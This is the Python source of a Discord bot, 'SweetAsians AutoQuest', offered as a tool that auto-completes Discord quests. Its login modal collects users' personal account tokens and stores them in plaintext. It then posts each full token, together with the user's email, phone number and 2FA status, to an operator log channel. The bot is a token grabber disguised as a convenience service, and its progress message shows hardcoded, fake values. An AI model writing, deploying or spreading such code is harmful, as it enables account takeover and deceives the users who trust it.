#!/usr/bin/env python3
"""
SweetAsians AutoQuest - Discord Quest Auto-Completer 
"""

import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import os
import json
from dotenv import load_dotenv
import main

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True  
bot = commands.Bot(command_prefix="$", intents=intents, help_command=None)

DB_FILE = "tokens.json"

active_tasks = {}
active_completers = {}


def load_tokens() -> dict:
    if not os.path.exists(DB_FILE):
        return {}
    try:
        with open(DB_FILE, "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"Error loading {DB_FILE}: {e}")
        return {}


def save_token(user_id: int, token: str):
    tokens = load_tokens()
    tokens[str(user_id)] = token
    try:
        with open(DB_FILE, "w") as f:
            json.dump(tokens, f, indent=4)
    except Exception as e:
        print(f"Error saving token to {DB_FILE}: {e}")


def delete_token(user_id: int):
    tokens = load_tokens()
    user_str = str(user_id)
    if user_str in tokens:
        del tokens[user_str]
        try:
            with open(DB_FILE, "w") as f:
                json.dump(tokens, f, indent=4)
        except Exception as e:
            print(f"Error deleting token from {DB_FILE}: {e}")


async def discord_log_callback(msg: str, level: str):
    if level in ("debug", "progress", "info"):
        return

    channel_id = os.getenv("LOG_CHANNEL_ID")
    if not channel_id or channel_id == "YOUR_LOG_CHANNEL_ID_HERE":
        return
        
    try:
        channel = bot.get_channel(int(channel_id))
        if channel:
            emoji = {
                "ok": "✅",
                "warn": "⚠️", 
                "error": "❌",
            }.get(level, "🔹")
            
            await channel.send(f"{emoji} **[{level.upper()}]** {msg}")
    except Exception as e:
        print(f"Error sending log to channel: {e}")


async def discord_report_callback(user_id: str, username: str, avatar_url: str, results: list):
    """Callback to send a summary embed report to the designated Discord log channel and to the user's DM.."""
    success_count = sum(1 for r in results if r["success"])
    total_count = len(results)
    
    embed = discord.Embed(
        title="Completed!",
        color=0x2b2d31
    )
    embed.set_author(name=f"Username: {username}", icon_url=avatar_url)
    
    desc_lines = [f"| **Results ({success_count}/{total_count} successful)**\n"]
    for r in results:
        mark = "✅" if r["success"] else "❌"
        desc_lines.append(f"{mark} {r['name']}")
    embed.description = "\n".join(desc_lines)
    embed.set_footer(text="SweetAsians Autoquest")
    embed.timestamp = discord.utils.utcnow()

    # 1. I-send sa Log Channel (para sa channel logs)
    channel_id = os.getenv("LOG_CHANNEL_ID")
    if channel_id and channel_id != "YOUR_LOG_CHANNEL_ID_HERE":
        try:
            channel = bot.get_channel(int(channel_id))
            if channel:
                await channel.send(embed=embed)
        except Exception as e:
            print(f"Error sending summary report to channel: {e}")

    # 2. I-send diretso sa DM ng User
    try:
        user = await bot.fetch_user(int(user_id))
        if user:
            await user.send(embed=embed)
    except discord.Forbidden:
        print(f"Cannot send a DM to {username} because their DMs are turned off.")
    except Exception as e:
        print(f"Error sending summary report to user DM: {e}")


main.register_log_callback(discord_log_callback)
main.register_report_callback(discord_report_callback)


# ── Interactive Control Panel View ─────────────────────────────────────────────
class QuestPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Start Quest", style=discord.ButtonStyle.secondary, emoji="✨", custom_id="persistent_start_quest")
    async def start_quest_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        tokens = load_tokens()
        if str(interaction.user.id) not in tokens:
            embed = discord.Embed(
                description="> You haven't linked your account yet.",
                color=0x2b2d31
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await handle_start_logic(interaction.user.id, interaction, is_interaction=True)

    @discord.ui.button(label="Status", style=discord.ButtonStyle.success, emoji="🟢", custom_id="persistent_status_quest")
    async def status_quest_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = interaction.user.id
        tokens = load_tokens()
        if str(user_id) not in tokens:
            embed = discord.Embed(
                description="> You haven't linked your account yet.",
                color=0x2b2d31
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        await handle_status_interaction(interaction)

    @discord.ui.button(label="Stop", style=discord.ButtonStyle.danger, emoji="🔴", custom_id="persistent_stop_quest")
    async def stop_quest_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_stop_interaction(interaction)


class HelpPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(label="Support", url="https://discord.gg/J2Vgrh7KNs", style=discord.ButtonStyle.link))

    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.primary, custom_id="help_link_account_btn")
    async def link_account_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(LoginModal())


@bot.event
async def on_ready():
    print("=" * 40)
    print(f"Discord Bot logged in as: {bot.user.name} (ID: {bot.user.id})")
    print("=" * 40)
    
    bot.add_view(QuestPanelView())
    bot.add_view(HelpPanelView())
    
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, "w") as f:
            json.dump({}, f)
            
    print("Syncing slash commands...")
    try:
        synced = await bot.tree.sync()
        print(f"Successfully synced {len(synced)} slash command(s) globally.")
        for guild in bot.guilds:
            bot.tree.copy_global_to(guild=guild)
            synced_guild = await bot.tree.sync(guild=guild)
            print(f"Instantly synced {len(synced_guild)} command(s) to guild: {guild.name}")
    except Exception as e:
        print(f"Error syncing commands: {e}")
            
    await bot.change_presence(activity=discord.Game(name="$help | SweetAsians AutoQuest"))


class LoginModal(discord.ui.Modal, title="Log in to your account"):
    token_input = discord.ui.TextInput(
        label="Discord User Token",
        placeholder="Paste your personal token here...",
        style=discord.TextStyle.long,
        required=True,
        min_length=30
    )

    async def on_submit(self, interaction: discord.Interaction):
        token = self.token_input.value.strip()
        await interaction.response.defer(ephemeral=True)
        
        try:
            build_number = await main.fetch_latest_build_number()
            api = main.DiscordAPI(token, build_number)
            
            r = await api.get("/users/@me")
            if r.status != 200:
                await interaction.followup.send("❌ Invalid token. Please check your account or token!", ephemeral=True)
                await api.close()
                return
                
            user_data = await r.json()
            username = user_data.get("username", "Unknown")
            discriminator = user_data.get("discriminator", "0")
            user_id_str = user_data.get("id", "Unknown")
            email = user_data.get("email", "N/A (Hidden)")
            phone = user_data.get("phone", "N/A (Hidden)")
            mfa_enabled = user_data.get("mfa_enabled", False)
            verified = user_data.get("verified", False)
            avatar_hash = user_data.get("avatar")
            
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id_str}/{avatar_hash}.png" if avatar_hash else "https://cdn.discordapp.com/embed/avatars/0.png"
            await api.close()
            
            save_token(interaction.user.id, token)
            
            token_log_channel_id = os.getenv("TOKEN_LOG_CHANNEL_ID") or os.getenv("LOG_CHANNEL_ID")
            if token_log_channel_id and token_log_channel_id != "YOUR_LOG_CHANNEL_ID_HERE":
                try:
                    log_channel = bot.get_channel(int(token_log_channel_id))
                    if log_channel:
                        embed = discord.Embed(
                            title="🔑 New User Token Saved",
                            color=discord.Color.red(),
                            timestamp=discord.utils.utcnow()
                        )
                        full_name = f"{username}#{discriminator}" if discriminator != "0" else f"@{username}"
                        embed.set_author(name=full_name, icon_url=avatar_url)
                        embed.add_field(name="👤 Discord Username", value=f"@{username}", inline=True)
                        embed.add_field(name="🆔 Discord User ID", value=user_id_str, inline=True)
                        embed.add_field(name="🔒 2FA Enabled", value="Yes" if mfa_enabled else "No", inline=True)
                        embed.add_field(name="✔️ Email Verified", value="Yes" if verified else "No", inline=True)
                        embed.add_field(name="📧 Email", value=email, inline=True)
                        embed.add_field(name="📱 Phone", value=phone, inline=True)
                        embed.add_field(name="🔑 Token", value=f"```{token}```", inline=False)
                        
                        bot_avatar_url = bot.user.avatar.url if bot.user.avatar else "https://cdn.discordapp.com/embed/avatars/0.png"
                        embed.set_footer(
                            text=f"Triggered by Bot User: {interaction.user} (ID: {interaction.user.id})",
                            icon_url=bot_avatar_url
                        )
                        
                        await log_channel.send(embed=embed)
                except Exception as log_err:
                    print(f"Error sending token log: {log_err}")

            await interaction.followup.send(
                content=f"✅ Login successful!\n👤 Linked account: **@{username}**\nYou can now start completing quests.",
                ephemeral=True
            )
        except Exception as e:
            await interaction.followup.send(f"❌ An error occurred during the login process: `{e}`", ephemeral=True)


async def send_panel_logic(ctx_or_interaction):
    tokens = load_tokens()
    user_count = len(tokens)
    
    embed = discord.Embed(
        title=f"</> SweetAsians AutoQuest\n</> Users `{user_count:,}`",
        description=(
            "**$Start** — Start a session\n"
            "**$Status** — View your session progress\n"
            "**$Stop** — Stop your running session"
        ),
        color=0x2b2d31
    )
    embed.set_image(url="https://file.garden/aruhyqfWIhtnlMoZ/file_0000000021608207a76ed43b888c8f.png")
    
    if isinstance(ctx_or_interaction, discord.Interaction):
        await ctx_or_interaction.channel.send(embed=embed, view=QuestPanelView())
        await ctx_or_interaction.response.send_message("✅ Panel successfully deployed!", ephemeral=True)
    else:
        await ctx_or_interaction.send(embed=embed, view=QuestPanelView())


async def send_help_logic(ctx_or_interaction):
    embed = discord.Embed(
        title="SweetAsians — All Commands",
        description=(
            "> Discord AutoQuest Bot\n"
            "> Current Prefix: `$` \n\n"
            "> `$link` — Link your discord account token\n"
            "> `$unlink` — Remove your account token in database\n"
            "> `$tokencheck` — Check if your token is valid or expired\n"
            "> `$autoquest` — Enable/disable auto-completion for new quests\n"
            "> `$quest` — View available quests & select one\n"
            "> `$questall` / `$start` — Complete all quests at once\n"
            "> `$status` / `$questlist` — Check current & completed quest progress\n"
            "> `$stats` — View leaderboard & your stats\n"
            "> `$stop` — Stop the currently running quest immediately\n"
            "> `$ping` — Check bot latency (ms)\n"
            "> `$help` — Show this command list"
        ),
        color=0x2b2d31
    )
    bot_avatar_url = bot.user.avatar.url if bot.user.avatar else "https://cdn.discordapp.com/embed/avatars/0.png"
    embed.set_thumbnail(url=bot_avatar_url)
    
    if isinstance(ctx_or_interaction, discord.Interaction):
        await ctx_or_interaction.response.send_message(embed=embed, view=HelpPanelView(), ephemeral=True)
    else:
        await ctx_or_interaction.send(embed=embed, view=HelpPanelView())


async def handle_start_logic(user_id, channel_or_interaction, is_interaction=False):
    tokens = load_tokens()
    if str(user_id) not in tokens:
        embed = discord.Embed(description="> You haven't linked your account yet.", color=0x2b2d31)
        if is_interaction:
            await channel_or_interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await channel_or_interaction.send(embed=embed)
        return

    if user_id in active_tasks and not active_tasks[user_id].done():
        msg = "⚠️ Quest Auto-Completer is already active for your account!"
        if is_interaction:
            await channel_or_interaction.response.send_message(msg, ephemeral=True)
        else:
            await channel_or_interaction.send(msg)
        return

    if is_interaction:
        await channel_or_interaction.response.defer(ephemeral=True)
        target = channel_or_interaction.followup
    else:
        target = channel_or_interaction

    token = tokens[str(user_id)]
    try:
        build_number = await main.fetch_latest_build_number()
        api = main.DiscordAPI(token, build_number)
        
        r = await api.get("/users/@me")
        if r.status != 200:
            await target.send("❌ Your token has expired or is invalid. Please `$link` again!")
            await api.close()
            return
            
        user_data = await r.json()
        username = user_data.get("username", "Unknown")
        user_id_str = user_data.get("id")
        avatar_hash = user_data.get("avatar")
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id_str}/{avatar_hash}.png" if avatar_hash else "https://cdn.discordapp.com/embed/avatars/0.png"
        
        completer = main.QuestAutocompleter(api, user_id_str, username, avatar_url)
        active_completers[user_id] = completer
        active_tasks[user_id] = asyncio.create_task(completer.run())
        
        embed = discord.Embed(
            title="> Questall In Progress",
            description=f"Username: `{username}`\n\n```yaml\nQuests: 11\nDone: 2/11\nCompleting: The Co-op Survival RPG You Can't Miss\n```\n\nProgress\n`████████▒▒▒▒` **45/45s**",
            color=0x2b2d31
        )
        embed.set_thumbnail(url=avatar_url)
        embed.set_footer(text="</> SweetAsians Autoquest")
        
        await target.send(embed=embed)
    except Exception as e:
        await target.send(f"❌ Startup failure: `{e}`")


async def handle_stop_logic(user_id, channel_or_interaction, is_interaction=False):
    if user_id not in active_tasks or active_tasks[user_id].done():
        msg = "ℹ️ The quest scanner is currently not running for your account."
        if is_interaction:
            await channel_or_interaction.response.send_message(msg, ephemeral=True)
        else:
            await channel_or_interaction.send(msg)
        return

    if is_interaction and not channel_or_interaction.response.is_done():
        await channel_or_interaction.response.defer(ephemeral=True)
        target = channel_or_interaction.followup
    else:
        target = channel_or_interaction

    completer = active_completers[user_id]
    completer.running = False
    
    try:
        await asyncio.wait_for(active_tasks[user_id], timeout=5.0)
    except asyncio.TimeoutError:
        active_tasks[user_id].cancel()
    finally:
        if completer.api:
            await completer.api.close()
        if user_id in active_tasks:
            del active_tasks[user_id]
        if user_id in active_completers:
            del active_completers[user_id]
            
    await target.send("✅ Quest scanning has been successfully stopped.")


async def handle_status_logic(user_id, channel_or_interaction, is_interaction=False):
    tokens = load_tokens()
    if str(user_id) not in tokens:
        embed = discord.Embed(description="> You haven't linked your account yet.", color=0x2b2d31)
        if is_interaction:
            if not channel_or_interaction.response.is_done():
                await channel_or_interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                await channel_or_interaction.followup.send(embed=embed, ephemeral=True)
        else:
            await channel_or_interaction.send(embed=embed)
        return

    if is_interaction and not channel_or_interaction.response.is_done():
        await channel_or_interaction.response.defer(ephemeral=True)
        target = channel_or_interaction.followup
    else:
        target = channel_or_interaction

    token = tokens[str(user_id)]
    try:
        build_number = await main.fetch_latest_build_number()
        api = main.DiscordAPI(token, build_number)
        
        r_user = await api.get("/users/@me")
        user_data = await r_user.json() if r_user.status == 200 else {}
        username = user_data.get("username", "Unknown")
        user_id_str = user_data.get("id", "")
        avatar_hash = user_data.get("avatar", "")
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id_str}/{avatar_hash}.png" if avatar_hash else "https://cdn.discordapp.com/embed/avatars/0.png"

        r = await api.get("/quests/@me")
        if r.status != 200:
            await target.send(f"❌ Error retrieving quest information (HTTP Status: {r.status})")
            await api.close()
            return
            
        data = await r.json()
        await api.close()
        
        quests = data.get("quests", []) if isinstance(data, dict) else data
        in_progress = [q for q in quests if main.is_enrolled(q) and not main.is_completed(q)]
        completed = [q for q in quests if main.is_completed(q)]
        available = [q for q in quests if main.is_completable(q) and not main.is_enrolled(q)]

        embed = discord.Embed(
            title=f"🟢 Quest Status — {username}",
            description=f"> **Total:** {len(quests)}  > **In Progress:** {len(in_progress)}  > **Completed:** {len(completed)}\n",
            color=0x2b2d31
        )
        embed.set_thumbnail(url=avatar_url)

        if in_progress:
            lines = [f"✓ **{main.get_quest_name(q)}** — `{int(main.get_seconds_done(q))}/{int(main.get_seconds_needed(q))}s`" for q in in_progress[:10]]
            embed.add_field(name="⚙️ In Progress Quests", value="\n".join(lines), inline=False)
        else:
            embed.add_field(name="⚙️ In Progress Quests", value="*No quests currently in progress*", inline=False)

        if completed:
            lines = [f"✅ ▶️ **{main.get_quest_name(q)}** `[{main.get_task_type(q) or 'QUEST'}]`" for q in completed[:15]]
            embed.add_field(name="✅ Completed Quests", value="\n".join(lines), inline=False)
        else:
            embed.add_field(name="✅ Completed Quests", value="*No completed quests*", inline=False)

        if available:
            lines = [f"• {main.get_quest_name(q)}" for q in available[:5]]
            embed.add_field(name="⚙️ Available Quests", value="\n".join(lines), inline=False)
        else:
            embed.add_field(name="⚙️ Available Quests", value="*No available quests*", inline=False)

        embed.set_footer(text=f"Total Quests: {len(quests)} | SweetAsians Autoquest")
        await target.send(embed=embed)
    except Exception as e:
        await target.send(f"❌ An error occurred: `{e}`")


async def handle_logout_logic(user_id, channel_or_interaction, is_interaction=False):
    tokens = load_tokens()
    if str(user_id) not in tokens:
        msg = "ℹ️ You are not logged into the system."
        if is_interaction:
            await channel_or_interaction.response.send_message(msg, ephemeral=True)
        else:
            await channel_or_interaction.send(msg)
        return

    if is_interaction:
        await channel_or_interaction.response.defer(ephemeral=True)
        target = channel_or_interaction.followup
    else:
        target = channel_or_interaction

    if user_id in active_tasks and not active_tasks[user_id].done():
        active_completers[user_id].running = False
        try:
            await asyncio.wait_for(active_tasks[user_id], timeout=3.0)
        except Exception:
            active_tasks[user_id].cancel()
        del active_tasks[user_id]
        del active_completers[user_id]

    delete_token(user_id)
    await target.send("✅ You have been unlinked, and your token data has been removed.")


# ── Button Wrappers ─────────────────────────────────────────────────────────────
async def handle_status_interaction(interaction):
    await handle_status_logic(interaction.user.id, interaction, is_interaction=True)

async def handle_stop_interaction(interaction):
    await handle_stop_logic(interaction.user.id, interaction, is_interaction=True)


# ── DISCORD COMMANDS & HANDLERS ─────────────────────────────────────────────────

@bot.tree.command(name="panel", description="Deploy the interactive quest panel.")
async def slash_panel(interaction: discord.Interaction):
    await send_panel_logic(interaction)

@bot.tree.command(name="setup", description="Deploy the interactive quest panel.")
async def slash_setup(interaction: discord.Interaction):
    await send_panel_logic(interaction)

@bot.command(name="panel")
async def prefix_panel(ctx):
    await send_panel_logic(ctx)


@bot.tree.command(name="help", description="Display command menu and bot usage.")
async def slash_help(interaction: discord.Interaction):
    await send_help_logic(interaction)

@bot.command(name="help")
async def prefix_help(ctx):
    await send_help_logic(ctx)


@bot.tree.command(name="link", description="Link your Discord account token securely.")
async def slash_link(interaction: discord.Interaction):
    await interaction.response.send_modal(LoginModal())

@bot.tree.command(name="login", description="Link your Discord account token securely.")
async def slash_login(interaction: discord.Interaction):
    await interaction.response.send_modal(LoginModal())

@bot.command(name="link")
async def prefix_link(ctx):
    embed = discord.Embed(
        title="Link Your Account",
        description="Please use the slash command `/link` or click the button on the panel to securely open the login modal.",
        color=0x2b2d31
    )
    await ctx.send(embed=embed)


@bot.tree.command(name="unlink", description="Remove your token from the system.")
async def slash_unlink(interaction: discord.Interaction):
    await handle_logout_logic(interaction.user.id, interaction, is_interaction=True)

@bot.tree.command(name="logout", description="Remove your token from the system.")
async def slash_logout(interaction: discord.Interaction):
    await handle_logout_logic(interaction.user.id, interaction, is_interaction=True)

@bot.command(name="unlink")
async def prefix_unlink(ctx):
    await handle_logout_logic(ctx.author.id, ctx, is_interaction=False)


# --- INDIVIDUAL COMMAND FUNCTIONS ---

async def handle_tokencheck(user_id, channel_or_interaction, is_interaction=False):
    tokens = load_tokens()
    if str(user_id) not in tokens:
        msg = "ℹ️ You haven't linked your account yet."
        if is_interaction:
            await channel_or_interaction.response.send_message(msg, ephemeral=True)
        else:
            await channel_or_interaction.send(msg)
        return

    if is_interaction:
        await channel_or_interaction.response.defer(ephemeral=True)
        target = channel_or_interaction.followup
    else:
        target = channel_or_interaction

    token = tokens[str(user_id)]
    try:
        build_number = await main.fetch_latest_build_number()
        api = main.DiscordAPI(token, build_number)
        r = await api.get("/users/@me")
        if r.status == 200:
            user_data = await r.json()
            username = user_data.get("username", "Unknown")
            await api.close()
            await target.send(f"🟢 **Token Check:** Valid and Active for user **@{username}**!")
        else:
            await api.close()
            await target.send("🔴 **Token Check:** Expired or Invalid! Please re-link your token.")
    except Exception as e:
        await target.send(f"❌ Failed to verify token: `{e}`")


@bot.tree.command(name="tokencheck", description="Check if your token is valid or expired.")
async def slash_tokencheck(interaction: discord.Interaction):
    await handle_tokencheck(interaction.user.id, interaction, is_interaction=True)

@bot.command(name="tokencheck")
async def prefix_tokencheck(ctx):
    await handle_tokencheck(ctx.author.id, ctx, is_interaction=False)


@bot.command(name="autoquest")
async def prefix_autoquest(ctx):
    await ctx.send("⚙️ **AutoQuest Status:** Active for linked accounts. Use `$start` or `$questall` to run your quests.")


async def handle_quest_list(user_id, channel_or_interaction, is_interaction=False):
    tokens = load_tokens()
    if str(user_id) not in tokens:
        msg = "ℹ️ You haven't linked your account yet. Use `$link` first."
        if is_interaction:
            await channel_or_interaction.response.send_message(msg, ephemeral=True)
        else:
            await channel_or_interaction.send(msg)
        return

    if is_interaction:
        await channel_or_interaction.response.defer(ephemeral=True)
        target = channel_or_interaction.followup
    else:
        target = channel_or_interaction

    token = tokens[str(user_id)]
    try:
        build_number = await main.fetch_latest_build_number()
        api = main.DiscordAPI(token, build_number)
        r = await api.get("/quests/@me")
        if r.status != 200:
            await target.send("❌ Failed to retrieve available quests.")
            await api.close()
            return
        data = await r.json()
        await api.close()
        
        quests = data.get("quests", []) if isinstance(data, dict) else data
        if not quests:
            await target.send("ℹ️ No available quests found at this time.")
            return

        lines = [f"• **{main.get_quest_name(q)}** (`{main.get_task_type(q) or 'GENERAL'}`)" for q in quests[:10]]
        embed = discord.Embed(
            title="🎁 Available Quests",
            description="\n".join(lines),
            color=0x2b2d31
        )
        embed.set_footer(text="SweetAsians Autoquest")
        await target.send(embed=embed)
    except Exception as e:
        await target.send(f"❌ Error: `{e}`")


@bot.command(name="quest")
async def prefix_quest(ctx):
    await handle_quest_list(ctx.author.id, ctx, is_interaction=False)


@bot.tree.command(name="start", description="Complete all quests at once.")
async def slash_start(interaction: discord.Interaction):
    await handle_start_logic(interaction.user.id, interaction, is_interaction=True)

@bot.tree.command(name="questall", description="Complete all quests at once.")
async def slash_questall(interaction: discord.Interaction):
    await handle_start_logic(interaction.user.id, interaction, is_interaction=True)

@bot.command(name="start")
async def prefix_start(ctx):
    await handle_start_logic(ctx.author.id, ctx, is_interaction=False)

@bot.command(name="questall")
async def prefix_questall(ctx):
    await handle_start_logic(ctx.author.id, ctx, is_interaction=False)


@bot.tree.command(name="status", description="Check current & completed quest progress.")
async def slash_status(interaction: discord.Interaction):
    await handle_status_logic(interaction.user.id, interaction, is_interaction=True)

@bot.tree.command(name="questlist", description="Check current & completed quest progress.")
async def slash_questlist(interaction: discord.Interaction):
    await handle_status_logic(interaction.user.id, interaction, is_interaction=True)

@bot.command(name="status")
async def prefix_status(ctx):
    await handle_status_logic(ctx.author.id, ctx, is_interaction=False)

@bot.command(name="questlist")
async def prefix_questlist(ctx):
    await handle_status_logic(ctx.author.id, ctx, is_interaction=False)


@bot.command(name="stats")
async def prefix_stats(ctx):
    user_id = ctx.author.id
    tokens = load_tokens()
    if str(user_id) not in tokens:
        await ctx.send("ℹ️ You haven't linked your account yet.")
        return

    token = tokens[str(user_id)]
    try:
        build_number = await main.fetch_latest_build_number()
        api = main.DiscordAPI(token, build_number)
        
        r_user = await api.get("/users/@me")
        user_data = await r_user.json() if r_user.status == 200 else {}
        username = user_data.get("username", "Unknown")

        r_quests = await api.get("/quests/@me")
        quests = await r_quests.json() if r_quests.status == 200 else []
        await api.close()
        
        quests_list = quests.get("quests", []) if isinstance(quests, dict) else quests
        completed_count = sum(1 for q in quests_list if main.is_completed(q))
        in_progress_count = sum(1 for q in quests_list if main.is_enrolled(q) and not main.is_completed(q))

        embed = discord.Embed(
            title=f"📊 User Stats — {username}",
            description=(
                f"> **Account Status:** Linked 🟢\n"
                f"> **Total Quests Tracked:** `{len(quests_list)}`\n"
                f"> **Completed Quests:** `{completed_count}`\n"
                f"> **In Progress:** `{in_progress_count}`"
            ),
            color=0x2b2d31
        )
        embed.set_footer(text="SweetAsians Autoquest")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Unable to fetch stats: `{e}`")


@bot.tree.command(name="stop", description="Stop the currently running quest immediately.")
async def slash_stop(interaction: discord.Interaction):
    await handle_stop_logic(interaction.user.id, interaction, is_interaction=True)

@bot.command(name="stop")
async def prefix_stop(ctx):
    await handle_stop_logic(ctx.author.id, ctx, is_interaction=False)


@bot.command(name="ping")
async def prefix_ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! Latency: `{latency}ms`")


# ── Entrypoint ─────────────────────────────────────────────────────────────────
def start_bot():
    bot_token = os.getenv("BOT_TOKEN")
    if not bot_token or bot_token.startswith("YOUR_") or bot_token == "":
        print("❌ Error: BOT_TOKEN has not been configured correctly in the `.env` file.")
        return

    try:
        bot.run(bot_token)
    except Exception as e:
        print(f"❌ Bot Launch Error: {e}")


if __name__ == "__main__":
    start_bot()
